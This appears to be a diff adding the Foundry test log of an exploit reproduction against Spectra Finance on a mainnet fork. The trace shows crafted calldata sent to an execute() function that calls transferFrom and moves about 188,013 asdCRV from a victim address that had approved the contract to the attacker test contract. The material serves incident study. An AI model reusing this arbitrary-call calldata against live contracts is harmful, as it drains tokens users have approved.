@@ -1,0 +1,56 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/Spectra_finance_exp.sol:ContractTest
+[PASS] testExploit() (gas: 84215)
+Logs:
+  [Begin] Attacker asdCRV balance before exploit: 0.000000000000000000
+  [End] Attacker asdCRV balance after exploit: 188013.365080870249823427
+
+Traces:
+  [3644] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 20369956 [2.036e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [110534] ContractTest::testExploit()
+    ├─ [9919] TransparentUpgradeableProxy::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [2676] SdCrvCompounder::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [3132] TransparentUpgradeableProxy::fallback() [staticcall]
+    │   ├─ [2392] SdCrvCompounder::decimals() [delegatecall]
+    │   │   └─ ← [Return] 18
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "[Begin] Attacker asdCRV balance before exploit", val: 0, decimals: 18)
+    ├─ [3419] TransparentUpgradeableProxy::fallback(0x279a7DBFaE376427FFac52fcb0883147D42165FF) [staticcall]
+    │   ├─ [2676] SdCrvCompounder::balanceOf(0x279a7DBFaE376427FFac52fcb0883147D42165FF) [delegatecall]
+    │   │   └─ ← [Return] 188013365080870249823427 [1.88e23]
+    │   └─ ← [Return] 188013365080870249823427 [1.88e23]
+    ├─ [65604] 0x3d20601ac0Ba9CAE4564dDf7870825c505B69F1a::execute(0x12, [0x00000000000000000000000043e54c2e7b3e294de3a155785f52ab49d87b9922000000000000000000000000eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee00000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000279a7dbfae376427ffac52fcb0883147d42165ff0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000027d03995eb8cff1bfcc300000000000000000000000000000000000000000000000000000000], 1721746447 [1.721e9])
+    │   ├─ [60554] 0x51BdbfCd7656e2C25Ad1BC8037F70572B7142eCC::execute(0x12, [0x00000000000000000000000043e54c2e7b3e294de3a155785f52ab49d87b9922000000000000000000000000eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee00000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000279a7dbfae376427ffac52fcb0883147d42165ff0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000027d03995eb8cff1bfcc300000000000000000000000000000000000000000000000000000000], 1721746447 [1.721e9]) [delegatecall]
+    │   │   ├─ [34486] TransparentUpgradeableProxy::fallback(0x279a7DBFaE376427FFac52fcb0883147D42165FF, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 188013365080870249823427 [1.88e23])
+    │   │   │   ├─ [33734] SdCrvCompounder::transferFrom(0x279a7DBFaE376427FFac52fcb0883147D42165FF, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 188013365080870249823427 [1.88e23]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: 0x279a7DBFaE376427FFac52fcb0883147D42165FF, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 188013365080870249823427 [1.88e23])
+    │   │   │   │   ├─ emit Approval(owner: 0x279a7DBFaE376427FFac52fcb0883147D42165FF, spender: 0x3d20601ac0Ba9CAE4564dDf7870825c505B69F1a, value: 0)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xd3895df6205a019dd5a3cdc1670f3f5ae822b83bc6129fca72a5ce822f798234: 0x0000000000000000000000000000000000000000000027d03995eb8cff1bfcc3 → 0
+    │   │   │   │   │   @ 0x91939e230aefd18e8695b22d31ca648a13eae765d03f258f39175c6ef5735cc0: 0 → 0x0000000000000000000000000000000000000000000027d03995eb8cff1bfcc3
+    │   │   │   │   │   @ 0x7271d2f5cdb2c6b6be69c44f7f31aa8feb9402738b8c60413ef799443d1ef9a0: 0x0000000000000000000000000000000000000000000027d03995eb8cff1bfcc3 → 0
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [1419] TransparentUpgradeableProxy::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [676] SdCrvCompounder::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 188013365080870249823427 [1.88e23]
+    │   └─ ← [Return] 188013365080870249823427 [1.88e23]
+    ├─ [1132] TransparentUpgradeableProxy::fallback() [staticcall]
+    │   ├─ [392] SdCrvCompounder::decimals() [delegatecall]
+    │   │   └─ ← [Return] 18
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "[End] Attacker asdCRV balance after exploit", val: 188013365080870249823427 [1.88e23], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.17s (2.80s CPU time)
+
+Ran 1 test suite in 5.88s (4.17s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
